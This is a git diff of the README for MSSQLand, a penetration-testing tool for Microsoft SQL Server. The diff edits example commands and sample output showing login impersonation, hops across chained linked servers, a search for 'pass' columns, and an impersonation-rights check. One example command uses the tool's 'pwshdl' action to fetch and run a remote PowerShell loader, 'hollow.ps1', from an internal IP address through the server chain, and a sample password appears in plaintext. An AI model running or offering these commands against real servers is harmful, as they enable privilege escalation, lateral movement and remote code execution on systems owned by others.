@@ -9,7 +9,7 @@ MSSQLand is your ultimate tool for interacting with [Microsoft SQL Server (MSSQL
 
 The tool's precise and structured output, enriched with timestamps and valuable contextual information, is designed to produce visually appealing and professional results, making it ideal for capturing high-quality screenshots for your reports. For example, running this command:
 ```shell
-MSSQLand.exe /h:SQL01:Moulinier /u:Jacquard /p:Fr@nce!1940%Tr1c /c:local /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:tables balard
+MSSQLand.exe /h:SQL01:Moulinier /u:Jacquard /p:Fr@nce!1940%Tr1c /c:local /l:SQL02:webapp03,SQL03:webapp04,SQL04:Merlaux /a:tables balard
 ```
 
 Create the following output:
@@ -30,11 +30,13 @@ Create the following output:
 |-> Server Version: 15.00.2000
 |-> Database: master
 |-> Client Connection ID: 09dfa162-725c-4aaa-9881-f788ed282db4
-[i] You can impersonate anyone as a sysadmin
+[i] You can impersonate anyone on SQL01 as a sysadmin
 [+] Successfully impersonated user: Moulinier
-[i] Logged in as Moulinier
+[i] Server chain: SQL02 -> SQL03 -> SQL04
+[i] Logged in on SQL04 as Merlaux
 |-> Mapped to the user guest
-[>] Executing action: Search
+
+[>] Executing action 'Search' against SQL04
 |-> Searching for 'pass' in database 'agents'
 
 [+] Found 'pass' in column headers:
@@ -101,14 +103,15 @@ The output is as follows:
 |-> Client Connection ID: 1e8fd867-77b7-4330-8d0d-deff353e5dcc
 [i] Logged in as NT AUTHORITY\SYSTEM
 |-> Mapped to the user dbo
-[i] You can impersonate anyone as a sysadmin
+[i] You can impersonate anyone on SQL01 as a sysadmin
 [+] Successfully impersonated user: webapp02
 [i] Logged in as webapp02
 |-> Mapped to the user dbo
-[i] Execution chain: localhost -> SQL02 -> SQL03 -> SQL04
-[i] Logged in as webapp05
-|-> Mapped to the user dbo
-[>] Executing action: Links
+[i] Execution chain: SQL02 -> SQL03 -> SQL04
+[i] Logged in on SQL04 as webapps
+|-> Mapped to the user guest
+
+[>] Executing action 'Links' against SQL04
 |-> Retrieving Linked SQL Servers
 
 | Last Modified        | Link  | Product    | Provider | Data Source | Local Login | Remote Login | RPC Out | OPENQUERY | Collation |
@@ -132,24 +135,25 @@ The output shows:
 [>] Attempting to impersonate user: webapp02
 [i] You can impersonate anyone as a sysadmin
 [+] Successfully impersonated user: webapp02
-[i] Server chain: SQL11 -> SQL27 -> SQL53
+[i] Server chain: SQL02 -> SQL03 -> SQL04
 [i] Logged in as webapps
 |-> Mapped to the user guest
-[>] Executing action: Impersonation
+
+[>] Executing action 'Impersonation' against SQL04
 |-> Starting impersonation check for all logins
 |-> Checking impersonation permissions individually
 
 | Logins      | Impersonation |
 | ----------- | ------------- |
 | sa          | No            |
-| Jacquard    | Yes           |
-| Calot       | No            |
-| Moulinier   | No            |
+| MarieJo     | Yes           |
+| Imane       | Yes           |
+| John        | No            |
 ```
 
 Great! Now you can directly reach out to your loader with:
 ```shell
-MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
+MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:MarieJo /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
 ```
 
 Or even use Common Language Runtime (CLR) to load remotely a library with:
